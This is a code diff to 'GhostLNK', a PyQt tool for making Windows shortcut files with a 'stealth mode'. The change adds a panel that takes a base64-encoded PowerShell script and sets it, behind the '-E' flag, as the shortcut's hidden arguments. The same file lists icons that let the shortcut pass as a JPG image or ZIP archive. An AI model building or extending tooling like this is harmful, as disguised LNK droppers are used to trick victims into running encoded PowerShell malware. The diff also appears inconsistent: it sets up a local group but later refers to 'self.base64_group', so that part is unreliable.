@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 """
 GhostLNK - Professional LNK Generator with Stealth Mode
 Created by: github.com/Excalibra
@@ -492,6 +491,37 @@ class GhostLNKGUI(QMainWindow):
         "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
         "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
     }
+    
+    def use_raw_base64(self):
+        """Take raw base64 from input, validate, and set as LNK payload."""
+        raw_b64 = self.base64_input.toPlainText().strip()
+        if not raw_b64:
+            QMessageBox.warning(self, "Warning", "No base64 string provided.")
+            return
+
+        # Optional: Validate that it's valid base64 (UTF-16LE expected)
+        try:
+            decoded = base64.b64decode(raw_b64).decode('utf-16le')
+            self.log(f"[✓] Base64 decoded successfully ({len(decoded)} chars)")
+        except Exception as e:
+            reply = QMessageBox.question(
+                self, "Invalid Base64",
+                f"Failed to decode as UTF-16LE base64:\n{str(e)}\n\nUse anyway?",
+                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
+            )
+            if reply == QMessageBox.StandardButton.No:
+                return
+
+        # Prepend '-E ' and set as argument
+        full_arg = f"-E {raw_b64}"
+        self.import_input.setText(full_arg)
+        self.preview_label.setText(f"Arguments: {full_arg[:100]}...")
+        self.log(f"[✓] Raw base64 loaded as payload (length {len(raw_b64)})")
+
+        # Update mode indicator
+        if not self.raw_mode_cb.isChecked():
+            self.mode_indicator.setText("Current Mode: Direct Base64 Payload")
+            self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
 
     def __init__(self):
         super().__init__()
@@ -936,6 +966,29 @@ class GhostLNKGUI(QMainWindow):
 
         self.import_group.setLayout(import_layout)
         layout.addWidget(self.import_group)
+        
+        # ---- Direct Base64 Input ----
+        base64_group = QGroupBox("🔐 Direct Base64 Input (Raw PowerShell Script)")
+        base64_layout = QVBoxLayout()
+
+        self.base64_input = QTextEdit()
+        self.base64_input.setPlaceholderText("Paste raw base64 string here (no -E prefix)...")
+        self.base64_input.setMaximumHeight(60)
+        self.base64_input.setStyleSheet("font-family: monospace;")
+        base64_layout.addWidget(self.base64_input)
+
+        btn_layout = QHBoxLayout()
+        self.use_base64_btn = QPushButton("Use This Base64 as Payload")
+        self.use_base64_btn.clicked.connect(self.use_raw_base64)
+        btn_layout.addWidget(self.use_base64_btn)
+
+        self.clear_base64_btn = QPushButton("Clear")
+        self.clear_base64_btn.clicked.connect(lambda: self.base64_input.clear())
+        btn_layout.addWidget(self.clear_base64_btn)
+
+        base64_layout.addLayout(btn_layout)
+        base64_group.setLayout(base64_layout)
+        layout.addWidget(base64_group)
 
         # Preview
         preview_group = QGroupBox("Payload Preview")
@@ -1012,6 +1065,7 @@ class GhostLNKGUI(QMainWindow):
 
     def toggle_raw_mode(self, enabled):
         """Show/hide raw target fields and disable PowerShell-specific options"""
+        self.base64_group.setVisible(not enabled)
         self.raw_widget.setVisible(enabled)
         self.import_group.setVisible(not enabled)
         self.type_combo.setEnabled(not enabled)
